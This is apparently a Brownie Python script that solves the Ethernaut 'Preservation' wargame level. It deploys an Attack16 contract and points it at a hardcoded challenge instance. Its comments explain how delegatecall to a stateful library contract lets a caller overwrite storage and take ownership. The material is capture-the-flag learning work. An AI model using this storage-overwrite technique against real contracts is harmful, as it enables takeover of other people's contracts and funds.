from scripts.helpful_scripts import get_account
from brownie import web3, interface, Attack16


ETHERNAUT_INSTANCE = "0xA75368BA443F90EF8B554696e59a60B5695DeE30"
GAS_LIMIT = 600000


def main():

    player = get_account()

    attack = Attack16.deploy({"from": player})
    attack.attack(ETHERNAUT_INSTANCE, {"from": player})

    # using console to check owner


""" 'message call' vs 'deleagtecall' """

# message call:
#
# A calls B, sends 100 wei
#            then:  B calls C sends 50 wei
#
# A  --->  B  --->  C
#                   msg.sender = B
#                   msg.value = 50 wei
#                   execute code on C's state variables
#                   use ETH in C
#
# delegatecall:
#
# A calls B, sends 100 wei
#            then:  B deleagatecall C
#
# A  --->  B  --->  C
#                   msg.sender = A
#                   msg.value = 100 wei
#                   execute code on B's state variables
#                   use ETH in B


# function setFirstTime(uint _timeStamp) public {
#         timeZone1Library.delegatecall(
#             abi.encodePacked(setTimeSignature, _timeStamp)
#         );
#     }

# contract LibraryContract {
#     // stores a timestamp
#     uint storedTime;

# --->  vulnerability is here - function should have been a 'library'
#     function setTime(uint _time) public {
#         storedTime = _time;
#     }
# }
